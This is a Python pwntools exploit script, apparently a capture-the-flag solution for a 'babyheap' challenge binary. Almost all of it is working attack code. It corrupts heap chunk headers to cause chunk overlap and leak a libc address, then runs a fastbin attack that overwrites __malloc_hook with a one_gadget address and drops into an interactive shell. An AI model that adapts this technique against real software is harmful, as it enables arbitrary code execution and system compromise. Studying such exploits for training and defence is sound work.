from pwn import *

context.log_level = "debug"

p = process("./babyheap")

def allocate(size,):

    p.sendline("1")
    print p.recv()
    p.sendline(str(size))
    print p.recv()

def fill(index,size, content,i=0):

    p.sendline("2")
    print p.recv()
    p.sendline(index)
    print p.recv()
    p.sendline(str(size))
    print p.recv()
    if i == 0:
        p.sendline(content)
    else:
        p.send(content)
    print p.recv()
    
def free(index):

    p.sendline("3")
    print p.recv()
    p.sendline(index)
    print p.recv()

def dump(index):

    p.sendline("4")
    print p.recv()
    p.sendline(index)
    return p.recv()

print p.recv()
#leak first.
#construct chunk overlap

allocate(0x20) #0
allocate(0x20) #1
allocate(0x20) #2
allocate(0x20) #3
allocate(0x20) #4
allocate(0x80) #5
allocate(0x60) #6
allocate(0x60) #7
allocate(0x60) #8
allocate(0x60) #9
allocate(0x60) #10

#Try to Create trunk overlap to cause a leak.
free("1")
free("3")
fill("2", 49,  "A"*32 + p64(0) + p64(0x31) + p8(0xf0),i=1)
fill("4", 48,  "A"*32 + p64(0) + p64(0x31),i=1)
#fast bin attack ,malloc to small bin overlap with size check bypass.

allocate(0x20) #3? where is 1?
allocate(0x20) #6
# index 3 pointing to index5. index 5 is smallbin , release it to get addr.

#fix index5's header
fill("4",48, "A"*32 + p64(0) + p64(0x91),i=1)

free("5")
data = dump("3")
print data

libc = u64(data.split("\n")[1][:6].ljust(8,"\x00")) - 0x3c4b78
print hex(libc)
target_under = libc + 0x3c4b0d - 0x8
target = libc + 0x3c4aed
malloc_hook = libc + 0x3c4b10
one_gadget = libc + 0x4526a

offset = malloc_hook - target - 0x10

allocate(0x80) #balance it.
#now we gonna try to acquire a shell.
#let's utilize fastbin atk again.

free("7")
free("9")
fill("8", 120, "A"*96 + p64(0) + p64(0x71) + p64(target), i=1)
print hex(target)

#malloc to malloc_hook@upper!

raw_input("before allocated!")
allocate(0x60)
allocate(0x60)

#print dump("9")
payload = "\x00" * offset + p64(one_gadget)
fill("9", len(payload), payload,i=1)
raw_input("hello!")
p.interactive()






